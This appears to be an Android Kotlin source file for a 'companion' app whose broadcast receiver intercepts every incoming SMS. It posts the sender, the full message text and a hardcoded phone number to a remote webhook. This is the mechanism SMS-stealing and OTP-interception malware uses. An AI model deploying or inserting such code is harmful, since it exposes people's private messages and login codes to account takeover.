package ir.ashkghalam.companion

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Telephony
import android.util.Log
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.util.concurrent.TimeUnit

class SmsOtpBridgeReceiver : BroadcastReceiver() {

    private val client = OkHttpClient.Builder()
        .connectTimeout(10, TimeUnit.SECONDS)
        .readTimeout(10, TimeUnit.SECONDS)
        .build()

    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == Telephony.Sms.Intents.SMS_RECEIVED_ACTION) {
            val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
            for (sms in messages) {
                val sender = sms.displayOriginatingAddress ?: ""
                val body = sms.displayMessageBody ?: ""
                
                Log.d("Ashk24SMS", "Received SMS from: $sender")
                forwardSmsToHost(sender, body)
            }
        }
    }

    private fun forwardSmsToHost(sender: String, messageText: String) {
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val json = JSONObject().apply {
                    put("senderNumber", sender)
                    put("receiverNumber", "09153108763")
                    put("messageText", messageText)
                    put("timestamp", System.currentTimeMillis())
                }

                val mediaType = "application/json; charset=utf-8".toMediaType()
                val requestBody = json.toString().toRequestBody(mediaType)

                val request = Request.Builder()
                    .url("https://secret.ashkghalam.ir/api/webhooks/sms")
                    .post(requestBody)
                    .addHeader("User-Agent", "Ashk24-Android-Companion/4.0.16-autonomous-engine")
                    .build()

                client.newCall(request).execute().use { response ->
                    Log.d("Ashk24SMS", "Relay Response: ${response.code}")
                }
            } catch (e: Exception) {
                Log.e("Ashk24SMS", "Relay failed: ${e.message}")
            }
        }
    }
}